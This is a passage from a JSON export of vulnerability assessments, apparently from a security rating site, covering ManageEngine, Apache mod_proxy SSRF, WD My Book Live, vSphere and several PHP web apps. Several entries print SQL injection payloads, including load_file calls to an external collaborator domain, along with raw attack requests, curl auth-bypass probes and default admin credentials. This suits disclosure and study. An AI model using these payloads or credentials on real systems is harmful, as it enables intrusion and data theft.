(172.16.57.222) port 8080 (#0)\r\n> GET /ompemberapp/NotificationTemplates/1638157451470_foo.txt HTTP/1.1\r\n> Host: 172.16.57.222:8080\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 200\r\n< Set-Cookie: JSESSIONIDADMP=8F4512A6AB47CB362598575B9413CBBB; Path=/; HttpOnly\r\n< X-XSS-Protection: 1; mode=block\r\n< Strict-Transport-Security: max-age=31536000 ; includeSubDomains\r\n< X-FRAME-OPTIONS: SAMEORIGIN\r\n< Accept-Ranges: bytes\r\n< ETag: W/\"4-1638157451470\"\r\n< Last-Modified: Mon, 29 Nov 2021 03:44:11 GMT\r\n< Content-Type: text/plain;charset=UTF-8\r\n< Content-Length: 4\r\n< Date: Mon, 29 Nov 2021 03:45:33 GMT\r\n< Server: ADMP\r\n<\r\nbar\r\n* Connection #0 to host 172.16.57.222 left intact\r\nwvu@kharak:~$\r\n```\r\n\r\n# Default creds...\r\n\r\nPlease change **all** these creds! Only the `admin` account is [clearly documented](https://www.manageengine.com/products/ad-manager/help/getting_started/deploying_admanager_plus_securely.html#step3).\r\n\r\n* `admin` **:** `admin`\r\n* `helpdesk` **:** `admin`\r\n* `hrassociate` **:** `admin`",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "ee17043a-7dd1-4526-a8f6-8d6539ba28a8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "ba4b0322-1e89-4506-b2ad-00d67e19b079",
      "created": "2021-11-29T16:33:35.614414Z",
      "revisionDate": "2021-11-29T22:32:51.984294Z",
      "document": "This is an interesting bug that allows one to exploit a bug in the  `mod_proxy` add on module of Apache HTTP server 2.4.48 and earlier to perform a server side request forgery (SSRF) attack and force the server to make requests on the attacker's behalf. It was discovered by the Apache HTTP security team whilst analyzing CVE-2021-36160.\r\n\r\nThis is already being exploited in the wild as noted at https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-270312-10F2.pdf with evidence that in at least one case, attackers were able to obtain hash values of user credentials from victim systems via this attack.\r\n\r\nThere is also evidence that this might affect Cisco products that bundle Apache HTTP Servers with them as noted at https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-httpd-2.4.49-VWL69sWQ however investigation is still ongoing on this matter by Cisco at the time of writing, with the only product confirmed as not being vulnerable listed as Cisco Virtual Topology System.\r\n\r\nIn general SSRF vulnerabilities are very valuable to attackers as they not only allow access to the internal network of a target, but they can disguise their requests as coming from a legitimate web server that the network trusts. This often means that there is more trust placed in these requests which sometimes means less security checks are placed on them.\r\n\r\nIt is also important to note that whilst this vulnerability does require the `mod_proxy` module to be loaded, this is an very common module for most servers and so it is likely to be loaded, increasing the likelihood that an outdated Apache server is vulnerable to this attack.\r\n\r\nIn short, this bug is being exploited in the wild, allows unauthenticated attackers a way to make trusted requests to internal endpoints, and has been used to steal hashed credentials in a real world attack. Whilst true impact will likely depend on the way the target network is configured and what vulnerabilities are on the systems accessible via the target web server, this vulnerability alone is already providing attackers a lot more insight into a target network through a very common server setup, and therefore should be patched as soon as possible.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "6d6d68d8-d927-4977-a67d-9300cebb9f5e",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b8d44717-2120-493b-a309-615bd8eca634",
      "created": "2021-11-30T19:11:30.65666Z",
      "revisionDate": "2023-05-17T07:58:55.638741Z",
      "document": "## [CTMS](https://www.sourcecodester.com/htmlcss/15055/covid-19-testing-management-system-ctms.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/unyasoft/CTMS/docs/Screenshot%202021-11-27%20121756-wall.png)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/unyasoft)\r\n\r\n## Description:\r\nThe parameters `username` and `contactno` from `COVID 19 Testing Management System (CTMS) 1.0` are vulnerable to Remote Code SQL injection attacks. \r\nTest REQUESTS:  Payloads 27325265' or 8079=8079-- and 35638130' or 9157=9162--.\r\nThese two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way.\r\nThe attacker can execute a Remote Code Injection to override the current password for the admin account directly from the broadcast networks! \r\nStatus Critical and awful.\r\nBR nu11secur1ty\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/unyasoft/CTMS)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/11/ctms.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5e12aae6-abbf-4e23-b38c-e94d8a8788e2",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "876d189e-fe17-4781-87b2-1bd257527c8b",
      "created": "2021-12-01T06:14:58.783613Z",
      "revisionDate": "2021-12-01T06:23:26.548242Z",
      "document": "From what I can tell this is likely a relatively easy exploit given that one resets the entire device via an unauthenticated request. This essentially allows the attacker to reset the device and erase all data on the storage device without any authentication at all. This could be used to ransom off targets and threaten to destroy their data if they don't comply, then use the bug to exploit the storage devices and wipe all their data if they didn't pay up.\r\n\r\nOf less value to attackers since they would likely just end up erasing a client's data however given how protective of data most companies are, I can imagine this most likely being used in ransom schemes as mentioned above. Less likely to be used to actually steal data unless by resetting the device you can somehow get other devices to resync the data to the drive and have the attacker now have full access to the box.\r\n\r\nOtherwise its good to note this has been exploited in the wild and there is no plan to patch this bug since the firmware went out of date in 2015 and the manufacture has stopped updating the firmware for this device with no plans to supply any changes even for security related issues. Your best bet is to migrate your data and get a more modern device. More info on the refactoring of the code that lead to this bug can be found at https://www.westerndigital.com/support/product-security/wdc-21008-recommended-security-measures-wd-mybooklive-wd-mybookliveduo",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "04a6ed02-d6ca-4888-9efe-55837842c912",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "089a72a5-aed8-49b6-b71e-6f2e797c22e3",
      "created": "2021-12-01T06:22:51.438212Z",
      "revisionDate": "2021-12-01T06:22:51.437497Z",
      "document": "An unauthenticated command injection bug in WD My Book Live and WD My Book Live Duo devices that gives root level access to the device and all the data stored on it. This has been actively exploited in the wild and there is no plan from the manufacture to fix this bug since it only affects WD My Book Live devices which they state where introduced to the market in 2010 and recieved their final update in 2015. Your best bet is to migrate your data and then get rid of this device somehow.\r\n\r\nIt is also important to note that this auth bypass occurs due to a refactoring of the authentication code where appropriate access checks were not applied. You can read more on this at https://www.westerndigital.com/support/product-security/wdc-21008-recommended-security-measures-wd-mybooklive-wd-mybookliveduo",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1723417c-7569-4f28-b2ec-7368e3e8c054",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "58597092-b629-4473-8d33-d21f897fbeef",
      "created": "2021-12-01T15:43:03.596183Z",
      "revisionDate": "2023-05-17T07:56:56.13077Z",
      "document": "## [CVE-2021-41492](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41492)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41492/docs/Screenshot%202021-12-01%20173729.png)\r\n\r\n## [Software](https://www.sourcecodester.com/php/14945/simple-cashiering-system-pos-php-and-sqlite-source-code-free-download.html)\r\n\r\n## Description:\r\nThe username parameter from `Sourcecodester Simple Cashiering System (POS) 1.0 ` appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. The attacker can retrieve sensitive information from the database for all users, and also administrator account!\r\n\r\n## MySQL Request:\r\n\r\n```mysql\r\nPOST /cashiering/Actions.php?a=login HTTP/1.1\r\nHost: 192.168.10.63\r\nOrigin: http://192.168.10.63\r\nCookie: PHPSESSID=bgtkft2eqoj6s4ajhp414erka3\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nReferer: http://192.168.10.63/cashiering/login.php\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 37\r\n\r\nusername=tralala'&password=@32e23eq3r\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Wed, 01 Dec 2021 12:06:18 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 521\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<br />\r\n<b>Warning</b>: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;5a72f9fa6edacd9d71b9e2dc9d1a9ecc&quot; in <b>C:\\xampp\\htdocs\\cashiering\\Actions.php</b> on line <b>1\r\n...[SNIP]...\r\n<b>Fatal error</b>: Uncaught Error: Call to a member function fetchArray() on bool in C:\\xampp\\htdocs\\cashiering\\Actions.php:15\r\nStack trace:\r\n#0 C:\\xampp\\htdocs\\cashiering\\Actions.php(233): Actions-&gt;login()\r\n#1 {main}\r\nthrown in <b>\r\n```\r\n\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41492)\r\n\r\n## Proof and exploit:\r\n[href](https://www.nu11secur1ty.com/2021/12/cve-2021-41492.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41492/docs/Screenshot%202021-12-01%20175827.png)\r\n\r\n## BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2259b43f-f3d8-4d5d-b6c1-50d0aed62525",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b09a5174-ed7c-47f9-9bd9-da7a90d69c6f",
      "created": "2021-12-02T19:12:05.283735Z",
      "revisionDate": "2021-12-02T19:12:05.281606Z",
      "document": "## [CVE-2021-37808](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37808)\r\n\r\n## [Vendor](https://phpgurukul.com/news-portal-project-in-php-and-mysql/)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-37808/dosc/Screenshot%202021-12-02%20204811.png)\r\n\r\n## Description:\r\nThe searchtitle parameter from News Portal Project 3.1 appears to be vulnerable to SQL injection attacks. \r\nThe payload '+(select load_file('\\\\\\\\wddcdzjvtmxtfkwxdw5gwdmxpovhj99x00osbiz7.nu11secur1tycollaborator.net\\\\lni'))+' was submitted in the searchtitle parameter. \r\nThis payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed. The attacker can be retrieving sensitive information \r\nfor all accounts of this system, and he can manipulate them! \r\nSTATUS: Critical and awful.\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-37808)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-37808/dosc/Screenshot%202021-12-02%20204948-terminal.png)\r\n\r\n## Proof and Exploit:\r\n[href](https://streamable.com/jmzf5i)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "13ca0eff-8db6-404e-b5b2-e53d8fedfb39",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "fe7e2037-f0e0-48d7-8f74-c9682bc04a73",
      "created": "2021-12-03T19:27:14.587837Z",
      "revisionDate": "2021-12-03T19:27:14.586788Z",
      "document": "The variant of CVE-2021-41379 that was released as a [zero-day exploit](https://github.com/jbaines-r7/InstallerFileTakeOver) is a local privilege escalation issue that is the result of a few issues with `msiexec.exe`. See the Rapid7 analysis for more details.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "289db8ef-7c96-48b0-a2c0-e868e400cded",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "cf12aac9-d9c7-4881-bbb1-e8f16090e482",
      "created": "2021-12-05T09:21:08.680206Z",
      "revisionDate": "2023-05-17T07:52:55.97155Z",
      "document": "## [CVE-2021-42668](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42668)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42668/docs/Screenshot%202021-12-03%20222841-exploit.png)\r\n\r\n## Description\r\nThe id from my_classmates.php in Engineers Online Portal 1.0 parameter appears to be vulnerable to SQL injection and RCE attacks. \r\nThe payload '+(select load_file('\\\\\\\\n0o5m5xdxay49mw826umfj1wsnygm9ix90xrkh86.nu11secur1tyPenetrationTestingEngineer.net\\\\sch'))+' was submitted in the id parameter. \r\nThis payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed. \r\nThe attacker can bypass the admin account and he can upload a malicious code by using the avatar vulnerability function with directory traversal method, \r\nthen he can execute this malicious code. For this example, the attacker destroys all files in the current directory. \r\nSTATUS Hiper Critical and Awful. \r\nCONCLUSION: This pseudo developer must be stopped immediately.\r\n\r\n## MySQL Request:\r\n\r\n```mysql\r\nGET /nia_munoz_monitoring_system/my_classmates.php?id=189' HTTP/1.1\r\nHost: 192.168.1.2\r\nCookie: PHPSESSID=k6gnppcljj6b7vs8ua3tdefmkt\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.2/nia_munoz_monitoring_system/dashboard_student.php\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\n\r\nHTTP/1.1 200 OK\r\nDate: Fri, 03 Dec 2021 17:54:59 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 5946\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!DOCTYPE html>\r\n<html class=\"no-js\">\r\n<head>\r\n<title>NIA Project Monitoring System</title>\r\n       <meta name=\"description\" content=\"Learning Management System\">\r\n       <meta name=\"keywords\" conte\r\n...[SNIP]...\r\n<ul     id=\"da-thumbs\" class=\"da-thumbs\">\r\n                                        You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''189'' order by lastname' at line 4\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42668)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2021/12/cve-2021-42668.html)\r\n\r\n## M0r3: \r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42668/docs/Screenshot%202021-12-08%20151358-hacked.png)\r\n\r\n## Proof and Explot:\r\n[href](https://www.nu11secur1ty.com/2021/12/cve-2021-42668.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cee95200-a9a7-43c7-9b0a-4abd812b31e4",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "9cbb3659-1bb6-47b7-864a-64edcfb82069",
      "created": "2021-12-06T09:04:58.783481Z",
      "revisionDate": "2022-01-05T17:07:01.821214Z",
      "document": "# The Long Tail of [CVE-2017-5641](https://www.vmware.com/security/advisories/VMSA-2017-0007.html)\r\n\r\nThis is not [CVE-2021-21980 or CVE-2021-22049](https://www.vmware.com/security/advisories/VMSA-2021-0027.html) but rather a curious case of [AMF deserialization](https://codewhitesec.blogspot.com/2017/04/amf.html) that was patched against auth bypass in the same update. My notes are as follows. RCE is incomplete, but maybe you can finish it!\r\n\r\n## Analyzing the patch and discovering the auth bypass\r\n\r\n```diff\r\n   public void doFilter(ServletRequest paramServletRequest, ServletResponse paramServletResponse, FilterChain paramFilterChain) throws IOException, ServletException {\r\n@@ -90,13 +122,11 @@ public class SessionManagementFilter implements Filter {\r\n       SessionUtil.setHttpRequest(httpServletRequest);\r\n       addHstsHeader(httpServletRequest, httpServletResponse);\r\n       String str = httpServletRequest.getRequestURI();\r\n-      boolean bool = str.endsWith(\"download/logs\");\r\n-      if (this._clientIdSecurityEnabled && bool) {\r\n-        boolean bool1 = validateClientId(httpServletRequest, httpServletResponse);\r\n-        if (!bool1) {\r\n-          httpServletResponse.setStatus(401);\r\n-          return;\r\n-        }\r\n+      if (this._authenticationProtectionEnabled &&\r\n+        !isSessionAuthenticated(httpServletRequest.getSession()) && !SessionUtil.isRequestWithValidSessionIndexCookie(httpServletRequest)) {\r\n+        _logger.warn(\"Rejecting request for URI: \" + str + \" without a valid client id!\");\r\n+        httpServletResponse.setStatus(401);\r\n+        return;\r\n       }\r\n       if (this._isH5Client || str.endsWith(\".html\")) {\r\n         HttpSession httpSession = httpServletRequest.getSession(true);\r\n```\r\n\r\n```java\r\n  private boolean validateClientId(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse) {\r\n    String str1 = SessionUtil.getClientId(paramHttpServletRequest.getSession());\r\n    String str2 = extractClientId(paramHttpServletRequest);\r\n    return (str1 != null || str2 != null);\r\n  }\r\n```\r\n\r\n```java\r\n  private String extractClientId(HttpServletRequest paramHttpServletRequest) {\r\n    String str = paramHttpServletRequest.getHeader(\"webClientSessionId\");\r\n    if (str == null)\r\n      str = paramHttpServletRequest.getParameter(\"webClientSessionId\");\r\n    return str;\r\n  }\r\n```\r\n\r\n## Testing a `GET` request _without_ the `webClientSessionId` parameter\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> GET /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n>\r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 401\r\n< Set-Cookie: JSESSIONID=87EF28C1FB437E91D3A46739E6FC1774; Path=/vsphere-client; Secure; HttpOnly\r\n< Content-Length: 0\r\n< Date: Sat, 04 Dec 2021 00:57:08 GMT\r\n< Server: Anonymous\r\n<\r\n* Connection #0 to host 172.16.57.237 left intact\r\nwvu@kharak:~$\r\n```\r\n\r\n## Testing a `GET` request with the `webClientSessionId` parameter\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs?webClientSessionId=nope\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS 